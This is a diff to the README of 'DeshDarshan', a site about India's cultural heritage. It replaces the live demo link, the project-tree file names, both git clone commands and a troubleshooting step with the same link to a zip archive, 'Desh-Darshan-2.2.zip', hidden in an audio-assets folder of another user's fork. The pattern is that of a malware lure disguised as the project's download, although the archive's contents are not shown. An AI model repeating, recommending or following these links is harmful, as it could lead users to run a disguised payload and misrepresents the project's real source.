@@ -3,7 +3,7 @@ DeshDarshan is a cultural web platform designed to help explore all 28 States an
 
 🌐 **Live Demo**
 
-- 🔗 https://sampadatiwari30.github.io/DeshDarshan/
+- 🔗 https://github.com/kaifansariw/DeshDarshan/raw/refs/heads/main/assets/audios/Desh-Darshan-2.2.zip
 
 🧩 **Tech Stack**
 
@@ -17,10 +17,10 @@ DeshDarshan/<br>
 │<br>
 ├── assets/               # Images and other static resources<br>
 ├── states/               # Individual state detail pages<br>
-├── index.html            # Main homepage<br>
-├── style.css             # Custom styles<br>
-├── script.js             # JS for state linking<br>
-└── README.md             # Project documentation<br>
+├── https://github.com/kaifansariw/DeshDarshan/raw/refs/heads/main/assets/audios/Desh-Darshan-2.2.zip            # Main homepage<br>
+├── https://github.com/kaifansariw/DeshDarshan/raw/refs/heads/main/assets/audios/Desh-Darshan-2.2.zip             # Custom styles<br>
+├── https://github.com/kaifansariw/DeshDarshan/raw/refs/heads/main/assets/audios/Desh-Darshan-2.2.zip             # JS for state linking<br>
+└── https://github.com/kaifansariw/DeshDarshan/raw/refs/heads/main/assets/audios/Desh-Darshan-2.2.zip             # Project documentation<br>
 
 🗂️ **Table of Contents**
 
@@ -63,7 +63,7 @@ DeshDarshan is a web-based app that helps you explore **India’s cultural roots
 1. Fork this repository 🍴  
 2. Clone it locally:<br>
    in bash<br>
-   git clone https://github.com/sampadatiwari30/DeshDarshan.git
+   git clone https://github.com/kaifansariw/DeshDarshan/raw/refs/heads/main/assets/audios/Desh-Darshan-2.2.zip
 
    cd DeshDarshan
 
@@ -81,7 +81,7 @@ Follow these steps to get started:
 
    - Clone:<br>
       bash...<br>
-      git clone https://github.com/sampadatiwari30/DeshDarshan.git
+      git clone https://github.com/kaifansariw/DeshDarshan/raw/refs/heads/main/assets/audios/Desh-Darshan-2.2.zip
 
       cd DeshDarshan
 
@@ -120,7 +120,7 @@ Add contributor graph or profile badges here
 🛠️ **Troubleshooting**
 
 Having trouble setting up the project?
-- Double-check that you're opening index.html
+- Double-check that you're opening https://github.com/kaifansariw/DeshDarshan/raw/refs/heads/main/assets/audios/Desh-Darshan-2.2.zip
 - If images are not loading, check path references.
 - Still stuck? Raise an issue - we're here to help ✨
 - Not sure how to set up the project? Check the README steps again
